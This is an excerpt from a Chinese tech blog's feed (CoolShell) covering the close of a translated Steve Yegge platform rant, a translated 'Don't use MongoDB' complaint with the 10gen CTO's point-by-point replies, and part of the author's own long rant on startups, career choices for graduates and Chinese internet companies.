<p>并不仅是他们是第一个。问题是，我们是一家“产品”公司，一直一直都是。我们开发的最成功最有吸引力的产品——搜索引擎，那样巨大的成功让我们产生了很多定式和偏见。</p>
<ul>
<li>Amazon过去也是家产品公司，一道神秘的力量使得Bezos领悟到他们需要平台。那道神秘力量来源于，他们被 逐渐蒸发的市值逼到墙角了，不得不想方设法突围出来。但他当时所拥有的只有一群工程师和他们的一堆计算机……除非他们能变成印钞机……你可以看到他们是怎么搞出来AWS的，而不是像我们Google+一样事后诸葛亮。</li>
</ul>
<ul>
<li>Microsoft从一开始就是个平台，所以他们有很多很多的实践。</li>
</ul>
<ul>
<li>Facebook：我有些没看透。我不是专家，不过我很肯定他们一开始也是一个产品，并且成功了很长时间。所以我不知道他们什么时候开始转变成为平台的。应该是很久以前的事了，因为他们要成为平台后，Mafia Wars这玩意才会出现（而Mafia Wars也很老了）。也许，Facebook只是看一眼我们，就问到：“我们如何击败Google？他们少了什么？”</li>
</ul>
<p>我们面对的问题非常的庞大，因为我们需要经过剧烈的文化转变后，我们才能迎头赶上。我们没有内部的SOA平台，所以我们外部也没有。这就是说，我们整个公司都“没有领会到”：产品经理没有，工程师没有，产品团队没有，没人领会到。就算是个别人有，比如你你有，那也相当于没有，除非我们在生死存亡的时候。我们不能这样不断推出产品，并装作我们以后会把这些产品转变成迷人美丽的可扩展式的平台。我们试过了，不行。</p>
<p>平台的黄金守则，“Eat Your Own Dogfood 吃自己的狗食”，换句话说，“先打造出自己使用平台，然后把它用在所有的地方”。你不能事后再做，那样做就太困难了——你去问问那些把MS Office平台化、把Amazon平台化的人。如果你放在后面做，那么你比一开始要花十倍的精力才能做对。你不能作弊，你不能让内部软件走秘密通道以取得特定的优先权限，不为什么，你必需从一开始就要解决这个问题。</p>
<p>我不是说现在做已经太迟了，但我们等的越长，我们就会越接近——“太迟了”。</p>
<p>老实说，我不知道这篇文章怎么收尾。我今天在这里说得太多了。因为这篇文章花了我6年时间。请包涵我言语冒犯之处，包涵我可能误解了一些产品，团队，或某个人。也许我们真的在开始做了很多平台方面的东西，只是我没看到。我只想说声对不起。</p>
<p>但是，我们现在开始必需把事做对了！</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-11-03T09:19:12+08:00</pubDate>
<guid>https://coolshell.cn/articles/5701.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 千万别用MongoDB？真的吗？！ ]]></title>
<link>https://coolshell.cn/articles/5826.html</link>
<content><![CDATA[ 
<p>某人发了一篇<a href="https://pastebin.com/raw.php?i=FD3xe6Jt" target="_blank">Don’t use MongoDB</a>的血泪控诉，我把原文翻译如下，你可以看看。不过，我想我们还要去看看10gen <a href="https://news.ycombinator.com/item?id=3202081" target="_blank">CTO的对此事的回复</a>，我们还要去在<a href="https://www.reddit.com/r/programming/comments/m2b2b/dont_use_mongodb/" target="_blank">Reddit上</a>看看大家的说法，10gen <a href="https://news.ycombinator.com/item?id=3202081" target="_blank">CTO的对此事的回复</a>后面也有一堆人在讨论这个事，还有一些程序员开始去读MongoDB的源码了，呵呵。看样子，说MongoDB的这些事并不是真的。</p>
<p>10gen CTO 对此事的并不完全知道，其在回复，对些文中的每一条都做了回复。我把其回复的大体意思也放在原文中。不过，很有意思的是那些程序员的讨论。建议大家看看。</p>
<h3>正文</h3>
<p>因为各种政治原因，我这段时间没有说什么，但是现在我觉得因为要对社会负责，所以我要阻止大家不要把你们的业务放在MongoDB上。</p>
<p>我的团队在一个有巨大用户量（一个有千万用户级的大型的公司）系统上使用的MongoDB，这个系统上让MongoDB有非常大的负载。早期，我们以为使用MongoDB会像10gen公司（MongoDB背后的公司）宣扬其在长期性能扩展有很多好处。但是，我们错了，而这个rant(长篇抱怨)就是为了让你不要相信那些所谓的成功经验而和我们一样犯了大错。如果有人能避免你上当，那么就得我写这么多。希望能警醒更多的人。</p>
<p>注意，对于和10gen打交道的经历来说，他们给予了我们充分了热情和帮助，而且非常地好。但是这并不能成为我不告诉大家他们的产品失败的理由。</p>
<p><span id="more-5826"></span></p>
<h4>为什么这么说？</h4>
<p>数据库应该是正确的，或是仅可能的正确，因为数据库的错误会比其它使用更大。不仅仅是因为其对运行，性能，开销，和其价值影响巨大，还因为其连带的东西。匆忙去去移植TB级的数据相比起去修改代码中的一个逻辑错误来说是一个很巨大的工作。而在系统出问题后需要恢复TB级的数据，而你即被限制住了，你会有一种绝望的感觉。</p>
<p>数据库是一个很复杂的系统，对于开发者来说就像一个黑盒一样。你需要对你所采用的数据库持绝对信任的态度，信任它会做正确的事，并尽会保持 一致笥和可用性。</p>
<p>为什么MongoDB会流行？</p>
<p>说句公道话，我们必需承认MongoDB是流行的，因为下面这些原因让其流行变得很合理：</p>
<ul>
<li>它非常容易地运行</li>
<li>非常自由的Schema模型，而且可以很容易地和JSON类的数据结果映射起来，这对于程序员来于有很大的感染力（它完全符合程序员的逻辑思维），而且，程序员总是在项目可以做技术选型的人。</li>
<li>成熟和分健壮，有记录，被真实的Use Case测试过，等等。对于那些喜欢选择成熟的技术的系统管理员和运营专业来说，这是一个很典型的选择。</li>
<li>它单系统，低读并发的性能测试非常令人惊讶，而对于那些没有经验的评估者来说，这基本上来说是最重要的。</li>
</ul>
<p>现在，你可能正在开发一个随便玩一玩的网站，或是一个原型，或是那种只考虑开发速度不考虑别的的项目。老实说，对于这种项止，无所谓你用什么样的技术，只要搞定工作就行了。</p>
<p>但是，如果你想要在MongoDB上搞一个大规模的系统，在上面运行真实的业务，那么，请不要用MongoDB。</p>
<h4>为什么不？</h4>
<p>1）MongoDB为了赢得Benchmark测试而默认使用了不安全的写方式</p>
<p>如果你不调用getLastError()，MongoDB就不会在确认数据库写操作完成就返回了，这会引入至少两种问题：</p>
<ul>
<li>在并发的环境下（连接池，等），在一个读操作“完成”后的连续地读操作会出错，MongoDB没有“栅栏条件锁”来知道什么时候完成写。</li>
<li>未知个数的保存操作会被丢弃，因为保存操作的队列会在不同的地方。比如TCP缓存等。当你和数据库连接因为一些意味情况断开的时候，这些东西就被丢弃了。</li>
</ul>
<blockquote>
<div>10gen CTO 回复： 这和Benchmark没有任何关系，并说这个就是API的设计，其交给用户自己去选择，因为写的方式也有很多种。</div>
</blockquote>
<p>2）MongoDB会以令人震惊的方式丢失数据</p>
<p>下面是一个我们所经历过的它丢数据的列表：</p>
<ul>
<li>数据就是丢了，原因未知</li>
<li>从损坏的数据库中恢复数据不成功，如事务日志。</li>
<li>主从结点间的数据复制有缺口，导致从结点丢失主结点有的数据。是的，没有CheckSum，并且是的，你还会看到数据复制过去了。</li>
<li>数据复制有时会停了，没有错误。你可以监控你的复制状态。</li>
</ul>
<blockquote>
<div>10gen CTO 逐一回复：1）从来没有一个数据丢失的BUG我们没有马上fix的事情。你能告诉我你报给我们的问题号吗？我们至少要明的是怎么一回事。如果是我们的问题，我们会马上fix的。2）从损坏了的数据库中不能完全恢复数据 ，这不挺正常的吗？但是如果有主从服务器互为备份应该会好一些。3）请告诉我你的问题号，我们从来没有接到过这样的错误报告。如果有，的确很严重。4）如果是说错误条件发生的时候没有通知，这有可能。另外，你可以监控数据复制的写操作，你可以使用w=2 为getLastError的参数。</div>
</blockquote>
<p>3）MongoDB 需要全局写锁来请求写操作</p>
<p>在写操作频繁的时候，这等同于杀了你。如果你运行一个blog，你也许不会关心这个事，因为你的读写操作不高。</p>
<blockquote><p>10gen CTO 回复：读写锁永远都是问题，但是2.0会好很多，2.2会解决得更好一些。</p></blockquote>
<p>4）MongoDB 的Sharding(分区) 在高负载下会停止工作</p>
<p>在高负载下加一个shard是一场恶梦。Mongo要么会移动其数据块太快而导致DOS攻击产生很多流量占用带宽，要么就完全地拒绝更多的数据块。这会使一个高流量的网站承受着沉重地写操作。</p>
<blockquote><p>10gen CTO 回复：如果系统已经超过了其负载，那么移动数据当然会变得很难。我每一次的演讲都说得很清楚，不要在系统性能不行的时候才去加shard，这不行的。</p></blockquote>
<p>5）Mongo 不可靠</p>
<p>Mongod/配置服务器/mongos的架构确定合理且聪明。不幸的是，mongos完全就是垃圾。在有负载的情况下，它时不时就都会崩溃，有时几个小时，有时几天。进程重启监控有时也不管用，因为他会抛出一些断言会伪造出一个关键线程，其导致进程还在运行。Double Fail。</p>
<p>最坏的是，唯一可行的方式是在一堆mongos实例前放一个HaProxy(一种负载均衡器)，运行一个作业其缓慢地轮着访问这些mongos实例，并定期kill掉他们，以变可以重新启动新的实例。我没有在开玩笑。</p>
<blockquote><p>10gen CTO 回复：不可能有这种事，你能不能告诉我更多的细节？</p></blockquote>
<p>6）MongoDB有一次甚至删除了整个数据库</p>
<p>MongoDB 1.6，在数据同步配置中，有时会配置了一个错误的结点（经常是一个空结点）是一个最新的数据结点。于是其它同步数据的结果上的<strong>数据就这样被干掉了</strong>（我说的是700GB的好数据），因为其把这个空结点的数据同步回有数据的结点上。数据库永远永远都不应该干这个。如果出现这种问题，数据库应该抛出一个错误而让DBA来选择合理的操作，或是强制使用正确的配置。而不应该删除所有的数据（那天太糟糕了）。</p>
<p>他们在1.8中修复了这个问题，偶滴神啊。</p>
<blockquote><p>10gen CTO 回复：找不到这样的事，也找不到相应提交的代码，你能多给点信息吗？</p></blockquote>
<p>7）发布了一些不应该发布东西</p>
<p>众所周知，在稳定版里能找到一些尴尬的bug其会导致数据问题——而我们总是在出了问题后他们才告诉我们这些问题，这是因为我们购买了10gen他们那超级诈骗的白金技术支持。他们回应是，发给我们一个hot patch，他们内部叫RC的玩意，然后让这个hot patch运行在我们的数据上。</p>
<blockquote><p>10gen CTO 回复：关于白金的技术支持，我们所接手的所有问题都会公开，fix也会公开。没有特定的情景，这种事很难讨论。我们会根据不同的情况作出不同的反应。我们希望我们的用户的问题能尽快得到解决。</p></blockquote>
<p>8）复制器在繁忙的服务器上黯然失色</p>
<p>复制器经常性的向Master发起DOS攻击，或是复制非常慢，花了巨长无比的时间，而oplog几乎被耗尽（就算是50GB的oplog）。</p>
<p>我们有一个繁忙的，大的数据集我们不会复制他因为它是动态的。那是令人痛苦的一个月，或是我们需要在选择不同的数据库系统前交叉双指（注：好运的手势）</p>
<blockquote><p>10gen CTO 回复：这看起来像上服务器负载过重了。我前面提到过了。</p></blockquote>
<p><strong>但是最糟糕的问题是：</strong></p>
<p>你可能会说，我这些问题都是过去式了；他们修复了所有这些问题或是他们会在下一版本中修复这些问题；X问题可以用Y实践来减轻。等等，等等。</p>
<p>不幸的是，你说这些东西一点用也没有。</p>
<p>真正的问题是，这么多的问题都是首要的问题。 数据库开发者要能hold住比一般程序员更高的标准。也就是说，你的优先级应该像下面这个样子：</p>
<ol>
<li>别搞丢数据，对数据要有完全的把握</li>
<li>通过实践保证可用性</li>
<li>多结点的性能扩展性</li>
<li>最小延迟应该保持在99%和95%之间</li>
<li>每个资源的每秒请求数</li>
</ol>
<p>10gen的顺序好像是 #5  为每一，其它项随便，#1 并不在前3位。</p>
<blockquote>
<p>10gen CTO 回复：这明显不是真的。看一看我们提交的代码，看一看我们的fix。 我们从来不会在release版中隐藏一个bug。如果我们非常在乎性能的benchmark的话，我们会花精力解决那些锁的问题，这样一来，多线程并发会更快一些。</p>
<p>MongoDB是一个新生的东西，还有很多东西需要打磨。如果你想来认识一下我们，我们欢迎你来认识一下我们。</p>
</blockquote>
<p>这些失败，还有那所暗示的公司的优先级，指出了一个最基本的企业文化的问题，其会让问题出现在任一发布版中：因为他们缺乏尊守必要的数据库系统的设计律条。</p>
<p>请慎重考虑这些警告。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-11-10T08:28:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/5826.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 来信， 创业 和 移动互联网 ]]></title>
<link>https://coolshell.cn/articles/5815.html</link>
<content><![CDATA[ 
<p>上一篇博文<a title="SteveY对Amazon和Google平台的长篇大论" href="https://coolshell.cn/articles/5701.html" target="_blank">翻译了Steve Yegge的rant</a>，这两天有一些事让我也想rant一下（所谓rant就是一篇巨长无比的抱怨和说教），不过无论是从见解还是恶搞来说肯定没有SteveY的水平高，所以，这篇博文只是单纯的rant，看标题就知道了，就像“<strong>篱笆，女人和狗</strong>”一样，乡土味实足。所以，下述的一些观点未必正确，也未必靠谱，也就是我的个人唠叨罢了，我想到哪里说到哪里。（篇幅较长，见谅）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%BC%95%E5%AD%90" title="引子">引子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E9%82%AE%E4%BB%B6%E5%9B%9E%E5%A4%8D" title="邮件回复">邮件回复</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%88%9B%E4%B8%9A_%E5%92%8C_%E4%BA%8B%E4%B8%9A" title="创业 和 事业">创业 和 事业</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%A7%BB%E5%8A%A8%E4%BA%92%E8%81%94%E7%BD%91" title="移动互联网">移动互联网</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%BB%93%E5%B0%BE" title="结尾">结尾</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%BC%95%E5%AD%90"></span>引子<span class="ez-toc-section-end"></span>
</h4>
<p>我前两天，收到一封邮件，一位快要毕业的的大学生问我，是去百度，还是去创新工场？他在来信中说，从个人道德价值观来说，他想去创新工场，要远离流氓企业，不然会有狼狈为奸、助纣为虐的感觉，对不起自己。但是创新工场那边情况不熟悉， 不知道怎么选择，并问我现在比较热的移动互联网靠不靠谱。</p>
<p>正好这两天我在微博里看到大家转贴李开复的几个让毕业生创业的微博，比如，<a href="https://weibo.com/1197161814/xwjDfAcf6" target="_blank">这个微博</a>，还有 <a href="https://weibo.com/1197161814/xw46V0Cz4" target="_blank">这个微博</a>。呵呵。</p>
<blockquote><p><strong>李开复</strong>：有关毕业生高科技创业,我的建议：1）创业需要理解趋势、汇集精英、实践经验,因此大学毕业不要主导创业,只能参加创业公司,2）最好远在毕业前就寻找创业公司实习机会（无偿亦可）,因为也许创业并不适合你或你想象那样,3）毕业时若想学习创业,最好到创业公司。到大公司学习能学技术但不够针对性。</p></blockquote>
<p>还有前两天的“移动开发者大会”，然后，又有一个以前的同事和我谈了一下他创业的事以及他的想法，正好又在网上看到罗永浩同学的那个“<a href="http://v.youku.com/v_show/id_XMzE3OTIyMzg0.html" target="_blank">一个理想者创业的故事</a>”的演讲。还有一些做blog插件的团队希望我能在酷壳上安装一下他们的插件。等等，等等。所以，让我有了这个可以rant的写作情绪。</p>
<p><span id="more-5815"></span></p>
<h4>
<span class="ez-toc-section" id="%E9%82%AE%E4%BB%B6%E5%9B%9E%E5%A4%8D"></span>邮件回复<span class="ez-toc-section-end"></span>
</h4>
<p>请原谅我不能把邮件的原文直接贴出来，因为自从上次我在博客中点名评批了关于敏捷的东西，我明白了，这个世界上，当把你放到公众的高度上，很多以前可以说的话可能都不能说了（虽然我还是在说，说得还比较尖锐，可能本性如此，呵呵）。言归正传，关于这个网友问我的问题，要是我的话，我可能两个都不会选，但是毕竟人家刚毕业，回想一下我当年毕业的时候，不也一样，就像菜市场里的大白菜一样被路过的人挑来捡去的，那有什么选择可言。人都是需要慢慢成长的，刚毕业的这个时候还不能挑挑捡捡的时候，能有两个offer在手作选择已是非常不错了。另外，人家刚毕业，面对北京这个物价奇高的地方，首先要解决的是生活下来，而不是像那些有工作经验的人一样可以追求更高层次的东西，所以，我不应该从我的角度上来思考这个问题，应该从他们的角度，从更现实的角度来思考。于是，我是大概是这么回复他的（加上了很多口水话是为了更像rant）——</p>
<ul>
<li>我对新东西是总是持谨慎的态度，创新工场的刚起步，还需要磨练，而且从现阶段的情况看下来，并不太妙。百度的技术还是很不错的，人家好多年了，用户数量也很大，也有很多积累了，所以还是应该去百度。我之所以这样评价，是因为我始终觉得：1）<strong>创业是不需要助跑的，创业是一种积累到了自然就出现的东西</strong>。你也许并不那么觉得，但是我觉得创业助跑就像高考的辅导班一样，或是像英语培训班一样，正如老罗所说的，出成绩的本来就是人家先天悟性不错，不行的总是不行，而需要培训的大多数总是有问题的，搞培训的都知道这个道理。退一步讲，就算是这些辅导班让你可以考个高分，但是后面呢？创业是一条很长的路，不是考了高分拿了风投被人宣传就能成的事。2）<strong>刚毕业的学生，要学的不是创业，而</strong><strong>是开眼界，长见识，这比任何事都重要，因为我们的的视野决定了我们的人生</strong>。大家也知道我国的教育是什么情况。所以，刚毕业的同学第一件事是把教育和工作差距上的那条大沟给填平了。因此，我觉得大公司有更多的资源和牛人能开阔你的眼界，而不是创新工场里的那些补习班式的团队和项目。而要开眼界应该是去一些成熟的公司，就算要学习创业也应该去那些成型了的创业公司，这是因为，更多的是你要看的那些成功公司的经验和思路。<strong>你可能知道什么不好，但是你没有见过好的，你将不知道什么是好的</strong>。你要学习的是成功的东西，而不是失败的东西，这是就我觉得开眼界长见识的最大的价值。</li>
</ul>
<ul>
<li>关于那些流氓企业（商业公司总是会有些商业手段的，但是使用的是流氓手段的必然是流氓），我们处在的这个社会似乎已经分不清楚什么是流氓手段，什么是商业手段，但是有些公司的做法还是太过份，在如今这样垃圾的社会中居然还能脱颖而出，不得不让人佩服。不过我认为，<strong>我们需要用出世的态度去思考，入世的态度去做事</strong>。社会是个大染坊，我们走入社会参加工作后，很多人都会迷失在其中，分不清什么是入世什么是出世，所以这需要我们坚持住我们心中那份理想的价值观，这个很难，能坚持下来的也不多。无论这个公司的文化让你有多么的不认同，但只要其好的东西（比如百度的技术还是很不错的），能让你开眼界长见识，那就没有问题。因为不管你去到哪里，那些恶心的事总是会或多或少的存在，这就是中国的社会。所以，<strong>我们去那些无良企业，并不是学他的文化，而是学习他的技术和他们把事做出来的经验，根据鲁迅的拿来主义，重要的去其糟粕，取其精华</strong>。必竟人家那么大，在技术方面总是有可取之处的，学成后离开他就好了。我们的教育把我们洗脑洗成了只有是和非的价值观，要么就是大好，要么就是大恶。所以，我们的感情要么就是爱，要么就是恨。没有必要，社会是多元的，多维的，这需要我们要学会分开看问题。<strong>对于刚毕业的学生，还是多去学学一些实实在在的技术，百度是有技术的</strong>。</li>
</ul>
<div>所以，对于李开复的微博，我认为，毕业去创业并不好。去学习创业也要看看是去哪里？很多朋友都觉得毕业就算学完了，这就错了。大学毕业表示真正的学习才刚刚开始，我比较保守，我觉得走出学校，还需要5-10年的社会学习和积累。我经历告诉我，大多数人是浮燥的，急功近利的，好大喜功的，无论是投资人，创业者，还是打工者。真正踏踏实实学习和努力的人很少。我想说是，不要被人两三句话就说得激动万分，不知道自己是谁了，<strong>你一开始没有吃好的饭，你总有一天得回来吃的</strong>。</div>
<h4>
<span class="ez-toc-section" id="%E5%88%9B%E4%B8%9A_%E5%92%8C_%E4%BA%8B%E4%B8%9A"></span>创业 和 事业<span class="ez-toc-section-end"></span>
</h4>
<p>我上上周未和我一个朋友聊了一下他的创业的想法和经历。他和我说他见到这个国外投资人曾投过MySQL，当这个投资人听到他的项目的时候，很惊讶，因为，投资人来中国听到几乎全部都是“业务型的项目”，而从他这里第一次听到“技术型的项目”。投资人非常感兴趣，于是就聊了一会就决定投他的项目了。</p>
<p>我在想，如果我们假设有一天MongoDB的创始人在中国找投资人，对中国的投资人说，我有一个很NB的想法，我要做一个开源的非关系型的数据库，可以解决大规模数据量的快速水平扩展的问题，并可以为现在互联网上的数据处理增加巨大的性能价值， 我不知道中国的投资人对这样的项目会不会感兴趣？我看悬。我这里不是说“业务型的项目”不好，我只是想说，在一个浮燥的环境里，几乎没人会关注这些“技术型的项目”。“业务型的项目”外表很华丽，更能打动人，可以让人看到“钱途”，所以，也就没人会关心那些可能改变世界的长期性的“技术型的项目”。多可悲的社会。</p>
<p>其实，<strong>创业就是开创事业</strong>。重点是事业，不是开个公司，也不是挣钱，<strong>公司和挣钱是你事业的副产品</strong>。<strong>事业是我们的理想，是我们对自己人生价值的一种诉求</strong>。我个人认为，只有上升上事业的层面上来，才能算得上是创业。如果你只是想开个公司，接两个项目做做，挣点钱，我觉得那就是在浪费时间浪费生命，还不如去跟着一个不错的公司打工，除非你是想以一种曲线的方式达到你的人生理想目标。<strong>你的公司至少应该要去改善或是颠覆点什么，如果还有价值观的输出，那就更完美了</strong>。总之一句话，<strong><span style="color: #cc0000;">别把自己给卖了</span></strong>。</p>
<p>就算是在公司里打工，也应该有这份理想主义。我一直和我的团队说——我们每一个人今天不愁找工作，外面也有很多东西在诱惑着我们。对于我们来说，我们今天在Amazon这个高速增涨并很踏实的公司里，我们应该把在公司里打工升华到事业的层面上来。看看，Amazon是怎么一点一点地、扎扎实实地、有条不紊地、通过技术分析用户和市场来改变世界的，想想自己在Amazon公司里可以影响些什么，可以领导些什么，可以跟着Amazon去为这个世界改变些什么。当你有这样的心态和方式，积累到了，你就能去改变些什么，那时，你要出去创业也就成了一件水到渠成的事。</p>
<p>看看今天如此浮燥的社会，我不知道人们怎么了。<strong>中国的很多的创业公司好像都只是为了上市挣钱，而国外更多的公司是为了上市后能改变世界或颠覆传统，这其中有多大的差距啊</strong>。每当看到中国有那么多的CopyCat（<a title="中国的C2C模式" href="https://coolshell.cn/articles/3820.html" target="_blank">或叫C2C</a>），而国外有那么多的创新，我实在无法为国人感到骄傲。他们甚至还为他们的抄袭找到很多理由，比如，有人说Linux 抄 Unix还不是抄，Windows还不是抄MacOS，OpenOffice抄MS Office，等等。我同意很多好的创意会被人Copy去，这本来也没有什么。只是我想说的是：</p>
<p style="padding-left: 30px;">1）判断一个事有没有抄了另一个事。我觉得不应该看其表面特征像不像，应该看其有没有颠覆性。比如Linux对Unix的颠覆。PC对苹果电脑的颠覆（Windows属于PC机颠覆时代的产物，让PC机更具颠覆性。 同样，Linux的开始也是先上x86）。<strong>就算是表面上复制了你，但是用另一种模式其改变了世界，颠覆了传统，创造了价值，这就不是抄袭</strong>。而中国的很多团队呢，还有那个山寨大王的公司，他们只不过是在做简单的复制，Copy而已，根本谈不上什么颠覆，不知道这个山寨公司怎么想的？钱没处花了吗？不知道这个世界上还有更多的东西更有价值吗？另外，举个例子，新浪微博可能是一个比较不错的复制，我暂时不说其在技术处理信息的回复上和Twitter巨大的差异（<a title="国内微博和Twitter的最大不同" href="https://coolshell.cn/articles/5247.html" target="_blank">可以看看这篇文章</a>），但是我们可以看到它还是有很多不错的功能（可惜的是新浪的名人路线让其永远不能理解什么是互联网的内涵，而很多人也迷失在这种浮华和虚荣之中）。而其它什么饭否，知乎，等等就是纯粹为了山寨了。如果我们不能颠覆一个产品，我们至少要想着去颠覆或是改善其某个或是几个功能吧。单纯的复制，走不长远，因为你无法理解其内涵。</p>
<p style="padding-left: 30px;">2）我们能不能问问我们自己。只是简单地去复制一个别人的想法，而没有经过自己的分析和考虑，这样的创业有意思吗？总有一些东西要不同吧，总不能靠我们政府帮你墙了你的复制源吧。这样的人生有什么意思吗？还是那句话——<strong>别把自己给卖了</strong>。</p>
<p>我有一些同学，都在给中国的国有银行做项目，做了十多年了，还是和十年前几乎一个样。项目就是打单，加班，赶工，需求拼命变更，被甲方和SB领导蹂躏，等等，等等。我在想，一个公司，十多年了，还是老样子，连最基本的商业运作和项目管理还是十年前老样子，哎。十年，在IT行业，这十年是完全翻天覆地的变化，人们的生活方式和传统都受到了前所未有的改变和颠覆。然而，我们很多这样的公司，这十年，他们并没有改变什么，连自己都没有改变。银行里的系统还是向十年前那样，还是用十年前的方式和银行打交道。这些公司，他们从未想过要去改变或是颠覆点什么，就算想过，也就坚持了一两年。<strong>我们中国的企业，大多数是没有理想，没有抱负的企业</strong>。这样的例子有很多很多。</p>
<ul>
<li>看看csdn，it-pub, 中文infoQ等一系例的技术论坛。尤其是 CSDN，也有十来年的历史了吧。从来没有想过怎么过提高信息质量，论坛和博客系统有段时间那叫一个难用啊。充斥着各种各样的广告和产商的软文和活动。看看<a href="https://weibo.com/1654762921/xx4FL0z6g" target="_blank">这个微博</a>（<strong>注</strong>：<span style="color: #800000;">这个微博已经删除了，这个微博是CSDN的老总范凯不知道怎么在论坛时放广告了，因为全都放满了</span>），你就知道为什么这些论坛干了那么长时间也无法成为像<a href="https://stackoverflow.com/" target="_blank">StackOverflow</a>或是<a href="https://www.quora.com/" target="_blank">Quora</a>这样的水平。再说说<a href="https://www.infoq.com/cn/" target="_blank">InfoQ中文站</a>，完全就是敏捷和TW的喉舌，主编里面有半数以上是TW公司的，上面的文章就像看新华网，人民网一样失去了媒体应有的客观性。而且那里的语言栏目没有C/C++语言，你能想像这些坑爹的编辑是怎么想的吗？所以，他们也无法成为像<a href="https://www.cnet.com/" target="_blank">CNet</a>, <a href="http://techcrunch.com/" target="_blank">TechCrunch</a>，或是像<a href="http://drdobbs.com/" target="_blank">Dr. Dobb’s</a>。因为那里是产商的广告战场，而不是技术人员的论坛。他们的目光短浅之处就在于，<strong>他们并没有明白真正让论坛和社区有人气有权威的是技术人员，而不是这些为了销售的产商。难道不想成为最权威的技术网站吗？难道不知道成为最权威的技术网站后面所蕴藏的商机会比今天这种模式要大N倍吗</strong>？</li>
</ul>
<ul>
<li>淘宝也一样（也许马云明白，下面的人不明白）。前段时间我在淘宝商城里买了一个假货。于是我找在线客服投诉，在线客服不管，让我打电话去杭州（这么大个公司连个800的客服电话都没有，shit!），我只好打到杭州，经过若干个占线的经历后（淘宝的call center真是弱爆了），杭州的客服告诉我，让我在线点“让淘宝客服介入”，我说，我打电话来淘宝就是让你介入的，但我却被告之要求介入的唯一方法必需是在网站上点相应的按钮。偶滴神啊，哪个脑子进水的经理设计的这客服流程啊（这不是和老罗那个短片里星巴克的“中杯”的段子不一样脑残吗）。好吧，我还没疯，我去网站点了，结果3-4个月，淘宝的客服根本就没找我，连个邮件都没发。可见，<strong>淘宝几乎是和商家一伙的，而不是站在买家一边的</strong>。淘宝的目光短浅之处就在于，<strong>他们并没有明白真正付钱的是买家，而不是那些商户。如果买家满意了，淘宝及其商户才能赚到钱。这么浅显的道理不懂吗？也许，淘宝知道他现在平台上的这些商户让他根本不敢面对买家</strong>（另外，关于淘宝的技术，我觉得有点两极分化，后台看似很强，但是前台用户的管理页面那个恶心啊，还要整些ActiveX插件，搞得只支持IE 和 Win，仅支持IE也罢了（最近发现其支持chrome了），有时候下单的时候看不见提交按钮，联系在线客服，他让我：换别的浏览器，如果不行，就清空所有的缓存，再不行就重装浏览器，WTF，你们开发人员有没有搞错啊）</li>
</ul>
<ul>
<li>百度和360就更SB了。有技术，有资金，有用户，有市场，还是上市公司，也积累了那么多年，也有很不错的产品和功能，但是就一定要去走流氓的路线，脑子透逗了吧。<strong>这不是目光短浅的问题了，这是人品和智商的问题了</strong>。难道百度不觉得有一个权威公正的搜索排名，会比恶意地竞价排名能挣更多的钱吗？难道百度不明白保护知识产权也能挣更多的钱吗？因为，当你让一个生态环境良性循环起来，你会发现，作为生态引擎的你会让整个生态系统更加依赖你，追捧你，而这个良性的生态系统会让你不由自主地进化和变得越来越强。对于360我就不多说了，你懂的，你要是不懂，那也不是目光短浅的问题了，也是智商的问题了。</li>
</ul>
<p>所以，他们能走到最高点也就是这样了。不想去创新，不想去改变传统方式，不去分析和关注用户，只为了挣钱挣钱，眼光就是如此短浅，所以也就成了钱和投资方的奴隶，于是也就变得愚蠢和迟钝了。<strong>真是Stay hungry, Stay foolish啊，hungry到饥不择食，foolish到自掘坟墓</strong>。</p>
<p>当然，你一定会说，对这些大公司来说是这样的，但是对于创业的小团队来说，我说的这些东西太大了，什么改变世界，什么颠覆传统，这个命题太大了。你甚至可以举出像“超级玛丽”这样的经典游戏，或是像“开心农场”这样打发时间的游戏，其并没有改变世界，也没有颠覆传统，但人家还是很成功的。没错，有些时候，我们创业并不需要去改变什么，只需要去满足别人些什么（满足他人的虚荣心的微博，让人打发时间的游戏）。对于我们大多数人来说，能做一个软件产品有很多用户在用就很满足了。能让很多用户来用你的东西，说白了还是在改变什么，或是在颠覆点什么。你没有发现，满足人们的虚荣心，让人打发时间也不是件简单的事，虽然这些只是玩一阵子就不玩的东西，但是，不可否认电子游戏界的创新以及其方式的改变也是相当猛的。</p>
<p>好吧，我再圆一圆我的话——<strong>创业总是要去改变点什么，颠覆点什么，或是满足点人们什么，解决点什么，而只有想要去创建某种规则，建立某种秩序，并有价值观输出的团队，才有可能成为真正的事业</strong>。</p>
<p>在这个社会里，很多人并不明白这个道理，就算是明白，也不会这么行事。我有一个以前的同事，来中国Amazon面试Kindle App团队的部门经理，过了，也给offer了。但是不想来，为什么？因为他觉得现在他在管一个几十人的团队。而Amazon的这个团队太小了，只有不到十人，而且职位的title不满意。这就是我前面说的，眼界不够开阔的问题。小团队干大事情这不挺好的吗？我们很多人都把眼光放在了那些虚的地方，比如部门大不大，位置高不高，薪水诱不诱人，但却没有看到要做这个事有多大。可惜啊。</p>
